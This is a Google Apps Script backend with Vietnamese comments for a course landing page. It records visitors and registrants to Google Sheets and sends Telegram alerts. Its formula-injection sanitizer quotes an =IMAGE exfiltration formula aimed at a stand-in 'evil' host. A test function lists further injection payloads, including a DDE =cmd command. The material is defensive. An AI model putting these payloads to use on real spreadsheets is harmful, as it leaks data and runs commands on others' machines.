/**
 * Muối Đi Học — Google Apps Script Web App
 *
 * Nhận POST JSON từ landing (Content-Type: text/plain) và phân nhánh theo eventType:
 *   - eventType === "visit"                     → ghi sheet "Visits" (khách vào, kể cả không đăng ký)
 *   - eventType === "registration" (mặc định)   → ghi sheet đăng ký + gửi Telegram (logic cũ)
 *
 * === Deploy (cập nhật app cũ) ===
 * 1. Mở Google Sheet đăng ký → Extensions → Apps Script
 * 2. Dán toàn bộ file này (thay code cũ), Save
 * 3. Cấu hình Telegram (nếu dùng): Project Settings → Script Properties → thêm
 *    TELEGRAM_BOT_TOKEN và TELEGRAM_CHAT_ID. KHÔNG ghi token vào file này — repo là public.
 * 4. Deploy → Manage deployments → Edit → Version: New version → Deploy
 * 5. Giữ quyền "Anyone". URL Web App không đổi → không cần sửa app.js
 *
 * Cả 2 sheet đều ghi thêm 6 cột thiết bị ở cuối (loại thiết bị mobile/tablet/desktop,
 * hệ điều hành, trình duyệt, màn hình, viewport, hướng).
 * Sheet đang có dữ liệu sẽ được bổ sung tiêu đề cho các cột mới ngay lần ghi kế tiếp.
 *
 * === Công thức gợi ý (tab Stats) — cột B của cả 2 sheet là VisitorId ===
 *   Tổng session visit:   =COUNTA(Visits!B:B)-1
 *   Unique visitor:       =COUNTA(UNIQUE(Visits!B2:B))
 *   Số đăng ký:           =COUNTA(Registrations!K:K)-1   // cột "Visitor ID" ở sheet đăng ký
 *   Unique chưa đăng ký:  =COUNTA(UNIQUE(FILTER(Visits!B2:B, COUNTIF(Registrations!K:K, Visits!B2:B)=0)))
 *   Visit theo thiết bị:  =QUERY(Visits!G2:G, "select Col1, count(Col1) where Col1 is not null group by Col1 label count(Col1) 'Số visit'")
 */

// =========================================================================
// CẤU HÌNH
// =========================================================================

// Tên sheet ghi lượt truy cập landing (khách vào mà chưa đăng ký).
const VISITS_SHEET_NAME = "Visits";

// Tên sheet ghi đăng ký. Không tìm thấy sheet đúng tên thì lùi về sheet đầu tiên
// (xem getRegistrationsSheet_) để giữ nguyên đích ghi của các deployment cũ.
const REGISTRATIONS_SHEET_NAME = "Registrations";

// Trần độ dài mỗi ô. Sheets cho phép tới 50.000 ký tự/ô nên nếu không chặn,
// một POST duy nhất có thể làm phình bảng tính.
const CELL_MAX_LENGTH = 500;
const LONG_TEXT_MAX_LENGTH = 2000;

// Thời gian chờ tối đa khi giành khoá ghi giữa các request đồng thời.
const LOCK_TIMEOUT_MS = 20000;

// Cột thiết bị dùng chung cho cả 2 sheet (luôn nằm ở cuối để không phá thứ tự cột cũ).
const DEVICE_HEADERS = [
  "Loại thiết bị",
  "Hệ điều hành",
  "Trình duyệt",
  "Màn hình (Screen)",
  "Viewport",
  "Hướng màn hình"
];

const VISITS_HEADERS = [
  "Thời gian ghi nhận",
  "Visitor ID",
  "Campaign CD",
  "Nguồn giới thiệu (Referrer)",
  "Đường dẫn (Path)",
  "Thời gian vào trang"
].concat(DEVICE_HEADERS);

const SHEET_HEADERS = [
  "Thời gian gửi",
  "Họ tên",
  "Tuổi",
  "Điện thoại",
  "Kinh nghiệm YouTube",
  "Điểm tiềm năng thu nhập",
  "Câu hỏi chuyên gia",
  "Đã xác nhận",
  "Email (tương thích)",
  "Ghi chú (tương thích)",
  "Visitor ID",
  "Campaign CD",
  "Thời gian xem",
  "Số lượt click",
  "Vị trí đăng ký"
].concat(DEVICE_HEADERS);

// Soi gương ràng buộc của isValidVietnamesePhone() trong app.js.
const VN_PHONE_PATTERN = /^0[35789]\d{8}$/;
const FULL_NAME_MAX_LENGTH = 100;
const AGE_MIN = 10;
const AGE_MAX = 100;

function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return jsonResponse_({ status: "error", message: "Thiếu dữ liệu POST." });
    }

    let data;
    try {
      data = JSON.parse(e.postData.contents);
    } catch (parseError) {
      console.warn("Payload không phải JSON hợp lệ: " + parseError);
      return jsonResponse_({ status: "error", message: "Dữ liệu gửi lên không hợp lệ." });
    }

    if (!data || typeof data !== "object") {
      return jsonResponse_({ status: "error", message: "Dữ liệu gửi lên không hợp lệ." });
    }

    // -------------------------------------------------------------
    // NHÁNH VISIT: chỉ ghi log truy cập, không gửi Telegram
    // -------------------------------------------------------------
    if (data.eventType === "visit") {
      withSheetLock_(function () {
        appendVisit_(data);
      });
      return jsonResponse_({ status: "success" });
    }

    // -------------------------------------------------------------
    // NHÁNH REGISTRATION (mặc định)
    // -------------------------------------------------------------
    const invalidFields = validateRegistration_(data);
    if (invalidFields.length > 0) {
      console.warn("Từ chối đăng ký, trường không hợp lệ: " + invalidFields.join(", "));
      return jsonResponse_({ status: "error", message: "Dữ liệu đăng ký không hợp lệ." });
    }

    // STEP 1: LUÔN ƯU TIÊN LƯU VÀO GOOGLE SHEETS
    const row = normalizeRow_(data);
    withSheetLock_(function () {
      const sheet = getRegistrationsSheet_();
      ensureHeaders_(sheet);
      sheet.appendRow(row);
    });

    // STEP 2: GỬI TELEGRAM AN TOÀN (KHÔNG LÀM HỎNG LUỒNG CHÍNH)
    // Nằm ngoài khoá ghi: đây là request mạng chậm, giữ khoá sẽ chặn người đăng ký khác.
    try {
      sendTelegramNotificationIfConfigured_(data);
    } catch (telegramError) {
      console.error("Lỗi gửi Telegram (đã bỏ qua để ưu tiên lưu Sheet): " + telegramError);
    }

    return jsonResponse_({ status: "success" });
  } catch (error) {
    // Chi tiết lỗi chỉ vào Executions log, không trả về client để tránh lộ cấu trúc script.
    console.error("doPost thất bại: " + (error && error.stack ? error.stack : error));
    return jsonResponse_({ status: "error", message: "Không thể xử lý yêu cầu. Vui lòng thử lại sau." });
  }
}

function doGet() {
  return jsonResponse_({ status: "ok" });
}

// -------------------------------------------------------------
// AN TOÀN DỮ LIỆU GHI VÀO SHEET
// -------------------------------------------------------------

/**
 * Khử formula injection và giới hạn kích thước trước khi ghi vào Sheet.
 *
 * Sheets biên dịch chuỗi mở đầu bằng = + - @ thành công thức y như gõ tay, nên một
 * cái tên kiểu =IMAGE("https://evil/?d="&A2) sẽ chạy dưới quyền chủ sheet và tuồn dữ
 * liệu ra ngoài. Dấu nháy đơn ở đầu ép Sheets hiểu đó là text.
 *
 * Hàm idempotent: chạy lại trên giá trị đã khử không sinh thêm dấu nháy.
 */
function sanitizeCell_(value, maxLength) {
  if (value === undefined || value === null) {
    return "";
  }

  const limit = maxLength || CELL_MAX_LENGTH;
  let text = String(value).replace(/[\u0000-\u001F\u007F]/g, " ").trim();

  if (text.length > limit) {
    text = text.slice(0, limit);
  }
  if (/^[=+\-@]/.test(text)) {
    text = "'" + text;
  }
  return text;
}

/** Ràng buộc soi gương validateEnrollmentForm() trong app.js. Trả về danh sách trường sai. */
function validateRegistration_(data) {
  const errors = [];

  const fullName = String(data.fullName || "").trim();
  if (!fullName || fullName.length > FULL_NAME_MAX_LENGTH) {
    errors.push("fullName");
  }

  const phone = String(data.phone || "").replace(/[\s.\-]/g, "");
  if (!VN_PHONE_PATTERN.test(phone)) {
    errors.push("phone");
  }

  const age = Number(String(data.age || "").trim());
  if (!isFinite(age) || age < AGE_MIN || age > AGE_MAX) {
    errors.push("age");
  }

  // Chỉ bắt buộc không rỗng, không so với danh sách option cố định: sửa option trong
  // index.html mà quên sửa script thì đăng ký thật vẫn không bị chặn oan.
  if (!String(data.youtubeExperience || "").trim()) {
    errors.push("youtubeExperience");
  }

  if (!isAcknowledged_(data)) {
    errors.push("acknowledgement");
  }

  return errors;
}

function isAcknowledged_(data) {
  return data.acknowledgement === true ||
    data.acknowledgement === "true" ||
    data.acknowledgement === "Đã hiểu";
}

/** Chạy action trong khoá ghi để hai request đồng thời không ghi đè nhau. */
function withSheetLock_(action) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(LOCK_TIMEOUT_MS)) {
    throw new Error("Không giành được khoá ghi sau " + LOCK_TIMEOUT_MS + "ms.");
  }
  try {
    return action();
  } finally {
    lock.releaseLock();
  }
}

/**
 * Sheet đăng ký, ưu tiên đúng tên cấu hình.
 *
 * Code cũ dùng getActiveSheet() — đích ghi phụ thuộc tab mà chủ file mở lần cuối, và
 * insertSheet() ở nhánh visit cũng đổi sheet active. Khi không có sheet đúng tên thì lùi
 * về sheet đầu tiên (đúng đích mà getActiveSheet() trả về khi chạy headless) thay vì tạo
 * sheet mới, để deployment đang chạy không bị tách dữ liệu đăng ký ra hai nơi.
 */
function getRegistrationsSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const named = ss.getSheetByName(REGISTRATIONS_SHEET_NAME);
  if (named) {
    return named;
  }

  const sheets = ss.getSheets();
  if (!sheets || sheets.length === 0) {
    throw new Error("Spreadsheet không có sheet nào để ghi đăng ký.");
  }
  return sheets[0];
}

// -------------------------------------------------------------
// GHI LƯỢT TRUY CẬP (VISIT)
// -------------------------------------------------------------
function appendVisit_(data) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(VISITS_SHEET_NAME);
  if (!sheet) {
    sheet = ss.insertSheet(VISITS_SHEET_NAME);
  }
  ensureSheetHeaders_(sheet, VISITS_HEADERS);

  sheet.appendRow([
    sanitizeCell_(new Date().toLocaleString("vi-VN")),
    sanitizeCell_(data.visitorId),
    sanitizeCell_(data.campaignCd),
    sanitizeCell_(data.referrer, LONG_TEXT_MAX_LENGTH),
    sanitizeCell_(data.path, LONG_TEXT_MAX_LENGTH),
    sanitizeCell_(data.landedAt)
  ].concat(deviceColumns_(data)));
}

/** Giá trị 6 cột thiết bị, đúng thứ tự DEVICE_HEADERS. */
function deviceColumns_(data) {
  return [
    sanitizeCell_(data.deviceType) || "Không rõ",
    sanitizeCell_(data.deviceOs),
    sanitizeCell_(data.deviceBrowser),
    sanitizeCell_(data.screenSize),
    sanitizeCell_(data.viewportSize),
    sanitizeCell_(data.orientation)
  ];
}

function ensureHeaders_(sheet) {
  ensureSheetHeaders_(sheet, SHEET_HEADERS);
}

/**
 * Đảm bảo hàng tiêu đề đủ rộng cho bộ cột hiện tại.
 * Sheet đã có dữ liệu chỉ được bổ sung tiêu đề cho các cột mới ở cuối,
 * tiêu đề cũ giữ nguyên để không phá công thức / bộ lọc đang dùng.
 */
function ensureSheetHeaders_(sheet, headers) {
  const maxColumns = sheet.getMaxColumns();
  if (maxColumns < headers.length) {
    sheet.insertColumnsAfter(maxColumns, headers.length - maxColumns);
  }

  if (sheet.getLastRow() === 0) {
    sheet.appendRow(headers);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight("bold");
    return;
  }

  const filledColumns = sheet.getLastColumn();
  if (filledColumns >= headers.length) {
    return;
  }

  const missing = headers.slice(filledColumns);
  sheet.getRange(1, filledColumns + 1, 1, missing.length)
    .setValues([missing])
    .setFontWeight("bold");
}

function normalizeRow_(data) {
  const raw = function (key, fallback) {
    if (data[key] === undefined || data[key] === null || data[key] === "") {
      return fallback !== undefined ? fallback : "";
    }
    return data[key];
  };

  // Không dùng .map(sanitizeCell_): Array.map truyền index vào tham số maxLength,
  // ô thứ hai của hàng sẽ bị cắt còn 1 ký tự.
  const text = function (key, fallback) {
    return sanitizeCell_(raw(key, fallback));
  };

  const acknowledgement = isAcknowledged_(data) ? "Đã hiểu" : text("acknowledgement");
  const question = sanitizeCell_(raw("expertQuestion", raw("message", "")), LONG_TEXT_MAX_LENGTH);
  const note = sanitizeCell_(raw("message", raw("expertQuestion", "")), LONG_TEXT_MAX_LENGTH);

  return [
    text("submittedAt"),
    text("fullName"),
    text("age"),
    text("phone"),
    text("youtubeExperience"),
    text("incomePotential"),
    question,
    acknowledgement,
    text("email", "Không thu thập"),
    note,
    text("visitorId"),
    text("campaignCd"),
    text("timeSpent"),
    text("clicks"),
    text("entryPoint")
  ].concat(deviceColumns_(data));
}

// -------------------------------------------------------------
// THÔNG BÁO TELEGRAM
// -------------------------------------------------------------

/**
 * Token đọc từ Script Properties, không bao giờ nằm trong file này (repo public).
 * Cấu hình: Apps Script Editor → Project Settings → Script Properties.
 */
function telegramConfig_() {
  const props = PropertiesService.getScriptProperties();
  return {
    token: String(props.getProperty("TELEGRAM_BOT_TOKEN") || "").trim(),
    chatId: String(props.getProperty("TELEGRAM_CHAT_ID") || "").trim()
  };
}

function sendTelegramNotificationIfConfigured_(data) {
  const config = telegramConfig_();
  if (!config.token || !config.chatId) {
    console.warn(
      "Chưa cấu hình Script Property TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID. " +
      "Hệ thống đã lưu Google Sheet thành công."
    );
    return;
  }
  sendTelegramNotification(data, config);
}

function sendTelegramNotification(data, config) {
  const acknowledgement = isAcknowledged_(data)
    ? "Đã hiểu"
    : escapeMarkdown_(String(data.acknowledgement || ""));

  const message =
    "🔔 *CÓ HỌC VIÊN ĐĂNG KÝ MỚI!*\n\n" +
    "👤 *Họ tên:* " + escapeMarkdown_(data.fullName) + "\n" +
    "🎂 *Tuổi:* " + escapeMarkdown_(data.age) + "\n" +
    "📞 *Điện thoại:* " + escapeMarkdown_(data.phone) + "\n" +
    "🎬 *Kinh nghiệm YouTube:* " + escapeMarkdown_(data.youtubeExperience) + "\n" +
    "📈 *Điểm tiềm năng thu nhập:* " + escapeMarkdown_(data.incomePotential) + "/10\n" +
    "✍️ *Câu hỏi chuyên gia:* " + escapeMarkdown_(data.expertQuestion || data.message) + "\n" +
    "✅ *Xác nhận:* " + acknowledgement + "\n\n" +
    "📊 *Dữ liệu chiến dịch (Tracking):*\n" +
    "▫️ *Nguồn (cd):* `" + escapeMarkdown_(data.campaignCd) + "`\n" +
    "▫️ *Thời gian xem:* " + escapeMarkdown_(data.timeSpent) + "\n" +
    "▫️ *Số lượt click:* " + escapeMarkdown_(data.clicks) + "\n" +
    "▫️ *Vị trí bấm đăng ký:* " + escapeMarkdown_(data.entryPoint) + "\n" +
    "▫️ *Thiết bị:* " + escapeMarkdown_(data.deviceType || "Không rõ") +
      " (" + escapeMarkdown_(data.deviceOs) + " · " + escapeMarkdown_(data.deviceBrowser) + ")\n" +
    "▫️ *Màn hình:* " + escapeMarkdown_(data.screenSize) +
      " | viewport " + escapeMarkdown_(data.viewportSize) + " | " + escapeMarkdown_(data.orientation) + "\n" +
    "▫️ *Mã khách (Visitor ID):* `" + escapeMarkdown_(data.visitorId) + "`\n" +
    "▫️ *Thời gian gửi:* " + escapeMarkdown_(data.submittedAt);

  const url = "https://api.telegram.org/bot" + config.token + "/sendMessage";
  const payload = {
    chat_id: config.chatId,
    text: message,
    parse_mode: "Markdown"
  };

  const options = {
    method: "post",
    contentType: "application/json",
    payload: JSON.stringify(payload),
    muteHttpExceptions: true
  };

  const response = UrlFetchApp.fetch(url, options);
  const code = response.getResponseCode();
  if (code < 200 || code >= 300) {
    console.error("Telegram API lỗi HTTP " + code + ": " + response.getContentText());
  }
}

function escapeMarkdown_(value) {
  if (value === undefined || value === null) {
    return "";
  }
  return String(value)
    .replace(/\\/g, "\\\\")
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/`/g, "\\`");
}

function jsonResponse_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

// -------------------------------------------------------------
// HÀM KIỂM TRA THỦ CÔNG (chạy trong editor, không dùng cho Web App)
// -------------------------------------------------------------

/**
 * (Tuỳ chọn) Chạy một lần trong editor để kiểm tra quyền / cấu hình.
 */
function testAppendSampleRow() {
  const sample = {
    submittedAt: new Date().toLocaleString("vi-VN"),
    fullName: "Nguyễn Văn A",
    age: "24",
    phone: "0901234567",
    youtubeExperience: "Mới tìm hiểu",
    incomePotential: "8",
    expertQuestion: "Làm sao bắt đầu kênh YouTube?",
    acknowledgement: true,
    email: "Không thu thập",
    message: "Làm sao bắt đầu kênh YouTube?",
    visitorId: "VISITOR-TEST123",
    campaignCd: "test",
    timeSpent: "120 giây",
    clicks: "5 lần",
    entryPoint: "test",
    deviceType: "Mobile",
    deviceOs: "iOS",
    deviceBrowser: "Facebook (in-app)",
    screenSize: "390x844",
    viewportSize: "390x664",
    orientation: "Portrait"
  };

  withSheetLock_(function () {
    const sheet = getRegistrationsSheet_();
    ensureHeaders_(sheet);
    sheet.appendRow(normalizeRow_(sample));
  });
}

/**
 * (Tuỳ chọn) Test ghi 1 dòng visit.
 */
function testAppendSampleVisit() {
  withSheetLock_(function () {
    appendVisit_({
      eventType: "visit",
      visitorId: "VISITOR-TEST123",
      campaignCd: "test",
      referrer: "https://facebook.com",
      path: "/?cd=test",
      landedAt: new Date().toLocaleString("vi-VN"),
      deviceType: "Tablet",
      deviceOs: "iPadOS",
      deviceBrowser: "Safari",
      screenSize: "1024x1366",
      viewportSize: "1024x1180",
      orientation: "Portrait"
    });
  });
}

/**
 * (Tuỳ chọn) Kiểm tra bộ khử formula injection mà không ghi gì vào Sheet.
 * Mọi dòng log phải bắt đầu bằng dấu nháy đơn.
 */
function testFormulaInjectionIsNeutralised() {
  const payloads = [
    '=IMAGE("https://example.com/x.png")',
    '=IMPORTXML("https://example.com","//a")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    "=cmd|'/c calc'!A1"
  ];
  payloads.forEach(function (payload) {
    console.log(payload + "  →  " + sanitizeCell_(payload));
  });
}
